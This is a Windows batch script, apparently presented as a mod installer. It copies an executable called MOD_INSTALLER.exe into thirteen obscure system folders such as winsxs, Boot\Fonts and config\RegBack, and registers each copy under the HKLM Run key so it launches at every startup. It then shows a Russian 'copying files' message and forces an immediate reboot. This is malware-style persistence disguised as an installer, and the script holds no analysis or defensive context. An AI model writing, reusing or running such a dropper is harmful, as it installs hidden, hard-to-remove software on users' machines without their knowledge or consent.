copy ".\bin\MOD_INSTALLER.exe" "C:\Windows\System32\MOD_INSTALLER.exe"

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v MOD_INSTALLER.exe /d C:\Windows\System32\MOD_INSTALLER.exe /f

cls

copy ".\bin\MOD_INSTALLER.exe" "C:\Windows\System32\com\MOD_INSTALLER.exe"

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v MOD_INSTALLER1.exe /d C:\Windows\System32\com\MOD_INSTALLER.exe /f

cls

copy ".\bin\MOD_INSTALLER.exe" "C:\Windows\System32\Setup\MOD_INSTALLER.exe"

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v MOD_INSTALLER2.exe /d C:\Windows\System32\Setup\MOD_INSTALLER.exe /f

cls

copy ".\bin\MOD_INSTALLER.exe" "C:\Windows\System32\Tasks\Microsoft\Windows\MOD_INSTALLER.exe"

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v MOD_INSTALLER3.exe /d C:\Windows\System32\Tasks\Microsoft\Windows\MOD_INSTALLER.exe /f


cls

copy ".\bin\MOD_INSTALLER.exe" "C:\Windows\System32\Tasks\Microsoft\Windows\Time Synchronization\MOD_INSTALLER.exe"

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v MOD_INSTALLER4.exe /d C:\Windows\System32\Tasks\Microsoft\Windows\Time Synchronization\MOD_INSTALLER.exe /f

cls

copy ".\bin\MOD_INSTALLER.exe" "C:\Windows\winsxs\MOD_INSTALLER.exe"

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v MOD_INSTALLER5.exe /d C:\Windows\winsxs\MOD_INSTALLER.exe /f

cls

copy ".\bin\MOD_INSTALLER.exe" "C:\Windows\Help\Windows\MOD_INSTALLER.exe"

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v MOD_INSTALLER6.exe /d C:\Windows\Help\Windows\MOD_INSTALLER.exe /f

cls

copy ".\bin\MOD_INSTALLER.exe" "C:\Windows\Boot\Fonts\MOD_INSTALLER.exe"

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v MOD_INSTALLER7.exe /d C:\Windows\Boot\Fonts\MOD_INSTALLER.exe /f

cls

copy ".\bin\MOD_INSTALLER.exe" "C:\Windows\AppPatch\ru-RU\MOD_INSTALLER.exe"

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v MOD_INSTALLER8.exe /d C:\Windows\AppPatch\ru-RU\MOD_INSTALLER.exe /f

cls

copy ".\bin\MOD_INSTALLER.exe" "C:\Windows\System32\WindowsPowerShell\v1.0\Examples\MOD_INSTALLER.exe"

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v MOD_INSTALLER9.exe /d C:\Windows\System32\WindowsPowerShell\v1.0\Examples\MOD_INSTALLER.exe /f

cls

copy ".\bin\MOD_INSTALLER.exe" "C:\Windows\System32\config\RegBack\MOD_INSTALLER.exe"

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v MOD_INSTALLER10.exe /d C:\Windows\System32\config\RegBack\MOD_INSTALLER.exe /f

cls

copy ".\bin\MOD_INSTALLER.exe" "C:\Windows\System32\drivers\ru-RU\MOD_INSTALLER.exe"

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v MOD_INSTALLER11.exe /d C:\Windows\System32\drivers\ru-RU\MOD_INSTALLER.exe /f

cls

copy ".\bin\MOD_INSTALLER.exe" "C:\Windows\security\ApplicationId\PolicyManagement\MOD_INSTALLER.exe"

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v MOD_INSTALLER12.exe /d C:\Windows\security\ApplicationId\PolicyManagement\MOD_INSTALLER.exe /f

cls


echo Копирование файлов , ждите ...
shutdown.exe -r -f -t 00
 